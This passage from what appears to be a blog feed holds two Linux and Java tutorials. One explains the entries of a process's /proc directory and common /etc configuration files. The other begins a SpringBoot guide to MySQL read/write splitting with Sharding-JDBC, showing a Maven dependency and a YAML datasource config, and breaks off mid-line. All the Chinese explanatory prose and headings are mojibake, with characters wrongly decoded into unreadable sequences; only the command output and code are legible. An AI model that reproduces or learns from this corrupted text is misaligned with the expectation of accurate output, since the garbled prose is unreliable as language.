äºŒã€è¿›ç¨‹ç›®å½•ä¸‹å„ç›®å½•è¯¦è§£</h2><p>è¿™æ˜¯æˆ‘åœ¨è‡ªå·±æœåŠ¡å™¨ä¸Šéšæ„æ‰¾çš„ä¸€ä¸ªè¿›ç¨‹å®ä¾‹å¦‚ä¸‹ï¼š</p> <figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs tap">[root@xyyHost01 var]<span class="hljs-comment"># ps -ef |grep redis</span><br>root     <span class="hljs-number"> 42007 </span><span class="hljs-number"> 75002 </span><span class="hljs-number"> 0 </span>20:15 pts/0    00:00:00 grep --color=auto redis<br>polkitd  <span class="hljs-number"> 68633 </span><span class="hljs-number"> 68614 </span><span class="hljs-number"> 0 </span>19:34 ?        00:00:06 redis-server *:6379<br>[root@xyyHost01 var]<span class="hljs-comment"># ll /proc/75002</span><br>æ€»ç”¨é‡ 0<br>dr-xr-xr-x<span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 0 </span>2æœˆ <span class="hljs-number"> 19 </span>20:14 attr<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 0 </span>2æœˆ <span class="hljs-number"> 19 </span>20:14 autogroup<br>-r--------<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 0 </span>2æœˆ <span class="hljs-number"> 19 </span>20:14 auxv<br>-r--r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 0 </span>2æœˆ <span class="hljs-number"> 19 </span>20:14 cgroup<br>--w-------<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 0 </span>2æœˆ <span class="hljs-number"> 19 </span>20:14 clear_refs<br>-r--r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 0 </span>2æœˆ <span class="hljs-number"> 19 </span>17:09 cmdline<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 0 </span>2æœˆ <span class="hljs-number"> 19 </span>17:10 comm<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 0 </span>2æœˆ <span class="hljs-number"> 19 </span>20:14 coredump_filter<br>-r--r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 0 </span>2æœˆ <span class="hljs-number"> 19 </span>20:14 cpuset<br>lrwxrwxrwx<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 0 </span>2æœˆ <span class="hljs-number"> 19 </span>20:14 cwd -&gt; /var<br>-r--------<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 0 </span>2æœˆ <span class="hljs-number"> 19 </span>17:09 environ<br>lrwxrwxrwx<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 0 </span>2æœˆ <span class="hljs-number"> 19 </span>17:09 exe -&gt; /usr/bin/bash<br>dr-x------<span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 0 </span>2æœˆ <span class="hljs-number"> 19 </span>17:09 fd<br>dr-x------<span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 0 </span>2æœˆ <span class="hljs-number"> 19 </span>20:14 fdinfo<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 0 </span>2æœˆ <span class="hljs-number"> 19 </span>20:14 gid_map<br>-r--------<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 0 </span>2æœˆ <span class="hljs-number"> 19 </span>20:14 io<br>-r--r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 0 </span>2æœˆ <span class="hljs-number"> 19 </span>20:14 limits<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 0 </span>2æœˆ <span class="hljs-number"> 19 </span>20:14 loginuid<br>dr-x------<span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 0 </span>2æœˆ <span class="hljs-number"> 19 </span>20:14 map_files<br>-r--r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 0 </span>2æœˆ <span class="hljs-number"> 19 </span>20:14 maps<br>-rw-------<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 0 </span>2æœˆ <span class="hljs-number"> 19 </span>20:14 mem<br>-r--r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 0 </span>2æœˆ <span class="hljs-number"> 19 </span>20:14 mountinfo<br>-r--r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 0 </span>2æœˆ <span class="hljs-number"> 19 </span>20:14 mounts<br>-r--------<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 0 </span>2æœˆ <span class="hljs-number"> 19 </span>20:14 mountstats<br>dr-xr-xr-x<span class="hljs-number"> 6 </span>root root<span class="hljs-number"> 0 </span>2æœˆ <span class="hljs-number"> 19 </span>20:14 net<br>dr-x--x--x<span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 0 </span>2æœˆ <span class="hljs-number"> 19 </span>20:14 ns<br>-r--r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 0 </span>2æœˆ <span class="hljs-number"> 19 </span>20:14 numa_maps<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 0 </span>2æœˆ <span class="hljs-number"> 19 </span>20:14 oom_adj<br>-r--r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 0 </span>2æœˆ <span class="hljs-number"> 19 </span>20:14 oom_score<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 0 </span>2æœˆ <span class="hljs-number"> 19 </span>20:14 oom_score_adj<br>-r--r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 0 </span>2æœˆ <span class="hljs-number"> 19 </span>20:14 pagemap<br>-r--------<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 0 </span>2æœˆ <span class="hljs-number"> 19 </span>20:14 patch_state<br>-r--r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 0 </span>2æœˆ <span class="hljs-number"> 19 </span>20:14 personality<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 0 </span>2æœˆ <span class="hljs-number"> 19 </span>20:14 projid_map<br>lrwxrwxrwx<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 0 </span>2æœˆ <span class="hljs-number"> 19 </span>20:14 root -&gt; /<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 0 </span>2æœˆ <span class="hljs-number"> 19 </span>20:14 sched<br>-r--r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 0 </span>2æœˆ <span class="hljs-number"> 19 </span>20:14 schedstat<br>-r--r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 0 </span>2æœˆ <span class="hljs-number"> 19 </span>20:14 sessionid<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 0 </span>2æœˆ <span class="hljs-number"> 19 </span>20:14 setgroups<br>-r--r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 0 </span>2æœˆ <span class="hljs-number"> 19 </span>20:14 smaps<br>-r--r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 0 </span>2æœˆ <span class="hljs-number"> 19 </span>20:14 stack<br>-r--r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 0 </span>2æœˆ <span class="hljs-number"> 19 </span>17:09 stat<br>-r--r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 0 </span>2æœˆ <span class="hljs-number"> 19 </span>17:09 statm<br>-r--r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 0 </span>2æœˆ <span class="hljs-number"> 19 </span>17:09 status<br>-r--r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 0 </span>2æœˆ <span class="hljs-number"> 19 </span>20:14 syscall<br>dr-xr-xr-x<span class="hljs-number"> 3 </span>root root<span class="hljs-number"> 0 </span>2æœˆ <span class="hljs-number"> 19 </span>20:14 task<br>-r--r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 0 </span>2æœˆ <span class="hljs-number"> 19 </span>20:14 timers<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 0 </span>2æœˆ <span class="hljs-number"> 19 </span>20:14 uid_map<br>-r--r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 0 </span>2æœˆ <span class="hljs-number"> 19 </span>20:14 wchan<br><br></code></pre></td></tr></table></figure><p>ä¸‹é¢åˆ—å‡ºä¸€äº›è¿›ç¨‹ç›®å½•ä¸‹å¸¸è§çš„ç›®å½•å¹¶è§£æï¼š</p><table><thead><tr><th>ç›®å½•å</th><th>è§£æ</th></tr></thead><tbody><tr><td>cmdline</td><td>å¯åŠ¨å½“å‰è¿›ç¨‹çš„å®Œæ•´å‘½ä»¤ï¼Œä½†åƒµå°¸è¿›ç¨‹ç›®å½•ä¸­çš„æ­¤æ–‡ä»¶ä¸åŒ…å«ä»»ä½•ä¿¡æ¯</td></tr><tr><td>cwd</td><td>æŒ‡å‘å½“å‰è¿›ç¨‹è¿è¡Œç›®å½•çš„ä¸€ä¸ªç¬¦å·é“¾æ¥</td></tr><tr><td>environ</td><td>å½“å‰è¿›ç¨‹çš„ç¯å¢ƒå˜é‡åˆ—è¡¨ï¼Œå½¼æ­¤é—´ç”¨ç©ºå­—ç¬¦ï¼ˆNULLï¼‰éš”å¼€ï¼›å˜é‡ç”¨å¤§å†™å­—æ¯è¡¨ç¤ºï¼Œå…¶å€¼ç”¨å°å†™å­—æ¯è¡¨ç¤º</td></tr><tr><td>exe</td><td>æŒ‡å‘å¯åŠ¨å½“å‰è¿›ç¨‹çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆå®Œæ•´è·¯å¾„ï¼‰çš„ç¬¦å·é“¾æ¥ï¼Œé€šè¿‡/proc/N/exeå¯ä»¥å¯åŠ¨å½“å‰è¿›ç¨‹çš„ä¸€ä¸ªæ‹·è´</td></tr><tr><td>fd</td><td>è¿™æ˜¯ä¸ªç›®å½•ï¼ŒåŒ…å«å½“å‰è¿›ç¨‹æ‰“å¼€çš„æ¯ä¸€ä¸ªæ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ï¼ˆfile descriptorï¼‰ï¼Œè¿™äº›æ–‡ä»¶æè¿°ç¬¦æ˜¯æŒ‡å‘å®é™…æ–‡ä»¶çš„ä¸€ä¸ªç¬¦å·é“¾æ¥</td></tr><tr><td>limits</td><td>å½“å‰è¿›ç¨‹æ‰€ä½¿ç”¨çš„æ¯ä¸€ä¸ªå—é™èµ„æºçš„è½¯é™åˆ¶ã€ç¡¬é™åˆ¶å’Œç®¡ç†å•å…ƒï¼›æ­¤æ–‡ä»¶ä»…å¯ç”±å®é™…å¯åŠ¨å½“å‰è¿›ç¨‹çš„UIDç”¨æˆ·è¯»å–ï¼ˆ2.6.24ä»¥åçš„å†…æ ¸ç‰ˆæœ¬æ”¯æŒæ­¤åŠŸèƒ½ï¼‰</td></tr><tr><td>maps</td><td>å½“å‰è¿›ç¨‹å…³è”åˆ°çš„æ¯ä¸ªå¯æ‰§è¡Œæ–‡ä»¶å’Œåº“æ–‡ä»¶åœ¨å†…å­˜ä¸­çš„æ˜ å°„åŒºåŸŸåŠå…¶è®¿é—®æƒé™æ‰€ç»„æˆçš„åˆ—è¡¨  mem</td></tr><tr><td>root</td><td>æŒ‡å‘å½“å‰è¿›ç¨‹è¿è¡Œæ ¹ç›®å½•çš„ç¬¦å·é“¾æ¥ï¼›åœ¨Unixå’ŒLinuxç³»ç»Ÿä¸Šï¼Œé€šå¸¸é‡‡ç”¨chrootå‘½ä»¤ä½¿æ¯ä¸ªè¿›ç¨‹è¿è¡Œäºç‹¬ç«‹çš„æ ¹ç›®å½•</td></tr><tr><td>stat</td><td>å½“å‰è¿›ç¨‹çš„çŠ¶æ€ä¿¡æ¯ï¼ŒåŒ…å«ä¸€ç³»ç»Ÿæ ¼å¼åŒ–åçš„æ•°æ®åˆ—ï¼Œå¯è¯»æ€§å·®ï¼Œé€šå¸¸ç”±pså‘½ä»¤ä½¿ç”¨</td></tr><tr><td>statm</td><td>å½“å‰è¿›ç¨‹å ç”¨å†…å­˜çš„çŠ¶æ€ä¿¡æ¯ï¼Œé€šå¸¸ä»¥â€œé¡µé¢â€ï¼ˆpageï¼‰è¡¨ç¤º</td></tr><tr><td>status</td><td>ä¸statæ‰€æä¾›ä¿¡æ¯ç±»ä¼¼ï¼Œä½†å¯è¯»æ€§è¾ƒå¥½ï¼Œæ¯è¡Œè¡¨ç¤ºä¸€ä¸ªå±æ€§ä¿¡æ¯</td></tr><tr><td>task</td><td>ç›®å½•æ–‡ä»¶ï¼ŒåŒ…å«ç”±å½“å‰è¿›ç¨‹æ‰€è¿è¡Œçš„æ¯ä¸€ä¸ªçº¿ç¨‹çš„ç›¸å…³ä¿¡æ¯ï¼Œæ¯ä¸ªçº¿ç¨‹çš„ç›¸å…³ä¿¡æ¯æ–‡ä»¶å‡ä¿å­˜åœ¨ä¸€ä¸ªç”±çº¿ç¨‹å·ï¼ˆtidï¼‰å‘½åçš„ç›®å½•ä¸­ï¼Œè¿™ç±»ä¼¼äºå…¶å†…å®¹ç±»ä¼¼äºæ¯ä¸ªè¿›ç¨‹ç›®å½•ä¸­çš„å†…å®¹ï¼›ï¼ˆå†…æ ¸2.6ç‰ˆæœ¬ä»¥åæ”¯æŒæ­¤åŠŸèƒ½ï¼‰</td></tr></tbody></table><h2 id="ä¸‰-etcæ–‡ä»¶ç³»ç»Ÿ"><a class="markdownIt-Anchor" href="#ä¸‰-etcæ–‡ä»¶ç³»ç»Ÿ"></a> ä¸‰ã€/etcæ–‡ä»¶ç³»ç»Ÿ</h2><p>/etcç›®å½•åŒ…å«å„ç§ç³»ç»Ÿé…ç½®æ–‡ä»¶ï¼Œè¿™é‡Œè¯´æ˜ä¸€äº›å¸¸è§çš„ï¼Œå…¶ä»–çš„å¯èƒ½å°±æ˜¯ä½ ä¸€çœ‹å°±çŸ¥åˆ°æ˜¯å±äºå“ªä¸ªç¨‹åºçš„é…ç½®æ–‡ä»¶ï¼Œå› ä¸ºå¾€å¾€å„ä¸ªç¨‹åºçš„é…ç½®æ–‡ä»¶åç§°ä¸ç¨‹åºåå¾ˆç›¸ä¼¼ã€‚</p><table><thead><tr><th>ç›®å½•å</th><th>è§£æ</th></tr></thead><tbody><tr><td>/etc/rcæˆ–/etc/rc.dæˆ–/etc/rc?.d</td><td>å¯åŠ¨ã€æˆ–æ”¹å˜è¿è¡Œçº§æ—¶è¿è¡Œçš„è„šæœ¬æˆ–è„šæœ¬çš„ç›®å½•ã€‚</td></tr><tr><td>/etc/passwd</td><td>ç”¨æˆ·æ•°æ®åº“ï¼Œå…¶ä¸­çš„åŸŸç»™å‡ºäº†ç”¨æˆ·åã€çœŸå®å§“åã€ç”¨æˆ·èµ·å§‹ç›®å½•ã€åŠ å¯†å£ä»¤å’Œç”¨æˆ·çš„å…¶</td></tr><tr><td>ä»–ä¿¡æ¯ã€‚</td><td></td></tr><tr><td>/etc/shadow</td><td>åœ¨å®‰è£…äº†å½±å­( shadow )å£ä»¤è½¯ä»¶çš„ç³»ç»Ÿä¸Šçš„å½±å­å£ä»¤æ–‡ä»¶ã€‚å½±å­å£ä»¤æ–‡ä»¶å°†/ etc /psswdæ–‡ä»¶ä¸­çš„åŠ å¯†å£ä»¤ç§»åŠ¨åˆ°/ etc /shadowä¸­ï¼Œè€Œåè€…åªå¯¹è¶…çº§ç”¨æˆ·( root)å¯è¯»ã€‚è¿™ä½¿ç ´è¯‘å£ä»¤æ›´å›°éš¾ï¼Œä»¥æ­¤å¢åŠ ç³»ç»Ÿçš„å®‰å…¨æ€§ã€‚</td></tr><tr><td>/etc/group</td><td>ç±»ä¼¼/etc/passwd ï¼Œä½†è¯´æ˜çš„ä¸æ˜¯ç”¨æˆ·ä¿¡æ¯è€Œæ˜¯ç»„çš„ä¿¡æ¯ã€‚åŒ…æ‹¬ç»„çš„å„ç§æ•°æ®ã€‚</td></tr><tr><td>/etc/fdprm</td><td>è½¯ç›˜å‚æ•°è¡¨ï¼Œç”¨ä»¥è¯´æ˜ä¸åŒçš„è½¯ç›˜æ ¼å¼ã€‚å¯ç”¨setfdprm è¿›è¡Œè®¾ç½®ã€‚æ›´å¤šçš„ä¿¡æ¯è§s e t f d p r mçš„å¸®åŠ©é¡µã€‚</td></tr><tr><td>/etc/fstab</td><td>æŒ‡å®šå¯åŠ¨æ—¶éœ€è¦è‡ªåŠ¨å®‰è£…çš„æ–‡ä»¶ç³»ç»Ÿåˆ—è¡¨ã€‚ä¹ŸåŒ…æ‹¬ç”¨swapon -aå¯ç”¨çš„s w a påŒºçš„ä¿¡æ¯ã€‚</td></tr><tr><td>/etc/inittab</td><td>init çš„é…ç½®æ–‡ä»¶ã€‚</td></tr><tr><td>/etc/issue</td><td>åŒ…æ‹¬ç”¨æˆ·åœ¨ç™»å½•æç¤ºç¬¦å‰çš„è¾“å‡ºä¿¡æ¯ã€‚é€šå¸¸åŒ…æ‹¬ç³»ç»Ÿçš„ä¸€æ®µçŸ­è¯´æ˜æˆ–æ¬¢è¿ä¿¡æ¯ã€‚å…·ä½“å†…å®¹ç”±ç³»ç»Ÿç®¡ç†å‘˜ç¡®å®šã€‚</td></tr><tr><td>/etc/magic</td><td>â€œf i l eâ€çš„é…ç½®æ–‡ä»¶ã€‚åŒ…å«ä¸åŒæ–‡ä»¶æ ¼å¼çš„è¯´æ˜ï¼Œâ€œf i l eâ€åŸºäºå®ƒçŒœæµ‹æ–‡ä»¶ç±»å‹ã€‚</td></tr><tr><td>/etc/motd</td><td>m o t dæ˜¯message of thedayçš„ç¼©å†™ï¼Œç”¨æˆ·æˆåŠŸç™»å½•åè‡ªåŠ¨è¾“å‡ºã€‚å†…å®¹ç”±ç³»ç»Ÿç®¡ç†å‘˜ç¡®å®šã€‚å¸¸ç”¨äºé€šå‘Šä¿¡æ¯ï¼Œå¦‚è®¡åˆ’å…³æœºæ—¶é—´çš„è­¦å‘Šç­‰ã€‚</td></tr><tr><td>/etc/mtab</td><td>å½“å‰å®‰è£…çš„æ–‡ä»¶ç³»ç»Ÿåˆ—è¡¨ã€‚ç”±è„šæœ¬( s c r i t p )åˆå§‹åŒ–ï¼Œå¹¶ç”±mountå‘½ä»¤è‡ªåŠ¨æ›´æ–°ã€‚å½“éœ€è¦ä¸€ä¸ªå½“å‰å®‰è£…çš„æ–‡ä»¶ç³»ç»Ÿçš„åˆ—è¡¨æ—¶ä½¿ç”¨(ä¾‹å¦‚df å‘½ä»¤)ã€‚</td></tr><tr><td>/etc/login.defs</td><td>loginå‘½ä»¤çš„é…ç½®æ–‡ä»¶ã€‚</td></tr><tr><td>/etc/printcap</td><td>ç±»ä¼¼/etc/termcap ï¼Œä½†é’ˆå¯¹æ‰“å°æœºã€‚è¯­æ³•ä¸åŒã€‚</td></tr><tr><td>/etc/profile ã€/ e t c / c s h . l o g i nã€/etc/csh.cshrc</td><td>ç™»å½•æˆ–å¯åŠ¨æ—¶b o u r n eæˆ–cshellsæ‰§è¡Œçš„æ–‡ä»¶ã€‚è¿™å…è®¸ç³»ç»Ÿç®¡ç†å‘˜ä¸ºæ‰€æœ‰ç”¨æˆ·å»ºç«‹å…¨å±€ç¼ºçœç¯å¢ƒã€‚</td></tr><tr><td>/etc/securetty</td><td>ç¡®è®¤å®‰å…¨ç»ˆç«¯ï¼Œå³å“ªä¸ªç»ˆç«¯å…è®¸è¶…çº§ç”¨æˆ·( r o o t)ç™»å½•ã€‚ä¸€èˆ¬åªåˆ—å‡ºè™šæ‹Ÿæ§åˆ¶å°ï¼Œè¿™æ ·å°±ä¸å¯èƒ½(è‡³å°‘å¾ˆå›°éš¾)é€šè¿‡è°ƒåˆ¶è§£è°ƒå™¨( m o d e m )æˆ–ç½‘ç»œé—¯å…¥ç³»ç»Ÿå¹¶å¾—åˆ°è¶…çº§ç”¨æˆ·ç‰¹æƒã€‚</td></tr><tr><td>/etc/shells</td><td>åˆ—å‡ºå¯ä»¥ä½¿ç”¨çš„shellã€‚chshå‘½ä»¤å…è®¸ç”¨æˆ·åœ¨æœ¬æ–‡ä»¶æŒ‡å®šèŒƒå›´å†…æ”¹å˜ç™»å½•çš„shellã€‚æä¾›ä¸€å°æœºå™¨f t pæœåŠ¡çš„æœåŠ¡è¿›ç¨‹ftpdæ£€æŸ¥ç”¨æˆ·shellæ˜¯å¦åˆ—åœ¨/etc/shells æ–‡ä»¶ä¸­ï¼Œå¦‚æœä¸æ˜¯ï¼Œå°†ä¸å…è®¸è¯¥ç”¨æˆ·ç™»å½•ã€‚</td></tr><tr><td>/etc/termcap</td><td>ç»ˆç«¯æ€§èƒ½æ•°æ®åº“ã€‚è¯´æ˜ä¸åŒçš„ç»ˆç«¯ç”¨ä»€ä¹ˆâ€œè½¬ä¹‰åºåˆ—â€æ§åˆ¶ã€‚å†™ç¨‹åºæ—¶ä¸ç›´æ¥è¾“å‡ºè½¬ä¹‰åºåˆ—(è¿™æ ·åªèƒ½å·¥ä½œäºç‰¹å®šå“ç‰Œçš„ç»ˆç«¯)ï¼Œè€Œæ˜¯ä»/etc/termcapä¸­æŸ¥æ‰¾è¦åšçš„å·¥ä½œçš„æ­£ç¡®åºåˆ—ã€‚è¿™æ ·ï¼Œå¤šæ•°çš„ç¨‹åºå¯ä»¥åœ¨å¤šæ•°ç»ˆç«¯ä¸Šè¿è¡Œã€‚</td></tr></tbody></table><h2 id="å››-devæ–‡ä»¶ç³»ç»Ÿ"><a class="markdownIt-Anchor" href="#å››-devæ–‡ä»¶ç³»ç»Ÿ"></a> å››ã€/devæ–‡ä»¶ç³»ç»Ÿ</h2><h2 id="äº”-usræ–‡ä»¶ç³»ç»Ÿ"><a class="markdownIt-Anchor" href="#äº”-usræ–‡ä»¶ç³»ç»Ÿ"></a> äº”ã€/usræ–‡ä»¶ç³»ç»Ÿ</h2><h2 id="å…­-varæ–‡ä»¶ç³»ç»Ÿ"><a class="markdownIt-Anchor" href="#å…­-varæ–‡ä»¶ç³»ç»Ÿ"></a> å…­ã€/varæ–‡ä»¶ç³»ç»Ÿ</h2><h2 id="ä¸ƒ-procæ–‡ä»¶ç³»ç»Ÿ"><a class="markdownIt-Anchor" href="#ä¸ƒ-procæ–‡ä»¶ç³»ç»Ÿ"></a> ä¸ƒã€/procæ–‡ä»¶ç³»ç»Ÿ</h2><p>å‚è€ƒæ–‡ç« </p><ol><li><a href="http://t.csdn.cn/hXZ6T">linuxæ–‡ä»¶ç›®å½•ï¼šLinuxä¸­å„ç›®å½•(æ–‡ä»¶å¤¹)ä½œç”¨è¯¦è§£ï¼ˆæŒç»­æ›´æ–°</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>docker</tag>
      
      <tag>redis</tag>
      
      <tag>æŒ‚è½½</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SpringBootå®ç°MySQLçš„ä¸»ä»å¤åˆ¶</title>
    <link href="/2023/02/06/SpringBoot%E5%AE%9E%E7%8E%B0MySQL%E7%9A%84%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"/>
    <url>/2023/02/06/SpringBoot%E5%AE%9E%E7%8E%B0MySQL%E7%9A%84%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="springbootå®ç°mysqlçš„ä¸»ä»å¤åˆ¶"><a class="markdownIt-Anchor" href="#springbootå®ç°mysqlçš„ä¸»ä»å¤åˆ¶"></a> SpringBootå®ç°MySQLçš„ä¸»ä»å¤åˆ¶</h1><p><a href="http://xtwoy.github.io/2022/11/27/%E9%80%9A%E8%BF%87docker%E5%AE%9E%E7%8E%B0MySQL%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/">ä»é›¶å¼€å§‹ï¼Œé€šè¿‡dockerå®ç°MySQLä¸»ä»å¤åˆ¶</a></p><h3 id="æ¦‚è¿°"><a class="markdownIt-Anchor" href="#æ¦‚è¿°"></a> æ¦‚è¿°</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/f141bcd96b9840bd8a4e1295055408a1.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />éš¾ä¹ˆå¦‚ä½•å»ç¡®å®šæ¥çš„SQLåº”è¯¥åˆ†é…åˆ°å“ªä¸ªåº“ä¸Šï¼Œè¿™ä¸ªå°±è¦é Sharding-jdbcæ¡†æ¶æ¥è¯»å†™åˆ†ç¦»çš„åˆ†æµå¤„ç†<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/83f78cd07cd848de9c4b5abd422d4b91.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><h3 id="å®æˆ˜"><a class="markdownIt-Anchor" href="#å®æˆ˜"></a> å®æˆ˜</h3><p>æ­¥éª¤å¦‚ä¸‹<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/f72981dfa9204bab9545793d04bc2ed9.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />å¯¼å…¥Mavenåæ ‡</p>  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.shardingsphere<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>sharding-jdbc-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.0-RC1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>é…ç½®ymlæ–‡ä»¶</p>  <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">application:</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">ccTakeOut</span><br>  <span class="hljs-attr">shardingsphere:</span><br>    <span class="hljs-attr">datasource:</span><br>      <span class="hljs-attr">names:</span><br>        <span class="hljs-string">master,slave</span><br>      <span class="hljs-comment"># ä¸»åº“ï¼ˆå¢åˆ æ”¹æ“ä½œï¼‰</span><br>      <span class="hljs-attr">master:</span><br>        <span class="hljs-attr">type:</span> <span class="hljs-string">com.alibaba.druid.pool.DruidDataSource</span><br>        <span class="hljs-attr">driver-class-name:</span> <span class="hljs-string">com.mysql.jdbc.Driver</span><br>        <span class="hljs-attr">url:</span> <span class="hljs-string">jdbc:mysql://ä½ çš„è™šæ‹ŸæœºIPåœ°å€:3307/reggie?characterEncoding=utf-8</span><br>        <span class="hljs-attr">username:</span> <span class="hljs-string">root</span><br>        <span class="hljs-attr">password:</span> <span class="hljs-string">root</span><br>      <span class="hljs-comment"># ä»æ•°æ®æºï¼ˆè¯»æ“ä½œï¼‰</span><br>      <span class="hljs-attr">slave:</span><br>        <span class="hljs-attr">type:</span> <span class="hljs-string">com.alibaba.druid.pool.DruidDataSource</span><br>        <span class="hljs-attr">driver-class-name:</span> <span 